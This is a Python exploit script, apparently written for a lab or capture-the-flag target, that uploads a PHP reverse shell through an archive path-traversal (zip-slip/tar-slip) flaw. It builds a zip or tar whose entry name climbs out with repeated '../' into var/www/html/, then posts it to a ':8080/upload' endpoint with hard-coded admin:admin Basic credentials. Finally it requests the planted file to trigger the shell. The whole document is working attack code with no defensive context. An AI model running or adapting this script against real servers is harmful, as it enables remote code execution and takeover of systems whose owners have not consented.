#/usr/bin/python3

#Upload a php reverse shell

import requests
from zipfile import ZipFile
import tarfile
import sys

if sys.argv[1] == "-h" or len(sys.argv) != 5:
	print("Usage: python3 {} <base_url without port> <file_to_upload> <number_of_directories> <zip/tar>".format(sys.argv[0]))

url = sys.argv[1]
filename1 = sys.argv[2]
backslashes = int(sys.argv[3]) * "../" + "var/www/html/"

#preparing the filename with backslashes
filename2 = backslashes + filename1


# If select zip
if sys.argv[4] == 'zip':
	zipobj = ZipFile('evil.zip', 'w')
	zipobj.write(filename1 ,filename2)
	zipobj.close()
	zipname = zipobj.filename

	#uploading zip file
	upload = requests.post(url+":8080/upload", headers ={"Authorization":"Basic YWRtaW46YWRtaW4="}, files={zipname: (zipname, open(zipname, 'rb'), 'application/zip')})
	print("Check your shell")
	shell = requests.get (url + "/" + filename1)


# If select tar
if sys.argv[4] == 'tar':
	tarobj = tarfile.open('evil.tar', 'w')
	tarobj.add(filename1, filename2)
	tarobj.close()
	tarname = tarobj.filename

	#uploading tar file
	upload = requests.post(url+":8080/upload", headers ={"Authorization":"Basic YWRtaW46YWRtaW4="}, files={tarname: (tarname, open(tarname, 'rb'), 'application/zip')})
	print("Check your shell")
	shell = requests.get (url + "/" + filename1)
